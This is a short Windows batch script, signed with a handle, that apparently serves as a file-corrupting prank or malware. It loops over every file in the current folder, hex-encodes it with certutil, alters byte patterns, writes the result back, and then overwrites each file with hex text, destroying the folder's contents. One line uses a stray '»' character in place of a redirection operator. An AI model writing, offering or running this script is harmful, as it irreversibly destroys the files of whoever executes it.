@echo off
rem by kroshmorkovkin
setlocal EnableDelayedExpansion 
for %%r in (*.*) do (
Title %%r
Echo %%r
certutil -f -encodehex "%%r" "fuckyou.hex"
set "hex="
for /f "usebackq tokens=2-17" %%a in ("fuckyou.hex") do set "hex=!hex!%%a %%b %%c %%d %%e %%f %%g %%h %%i %%j %%k %%l %%m %%n %%o %%p " >nul
>"fuckyou.hex" echo(!hex:a0 a0=bb bb bb!
certutil -f -decodehex "fuckyou.hex" "%%r" >nul
type fuckyou.hex > "%%r"
type fuckyou.hex » "%%r"
del "fuckyou.hex"
)
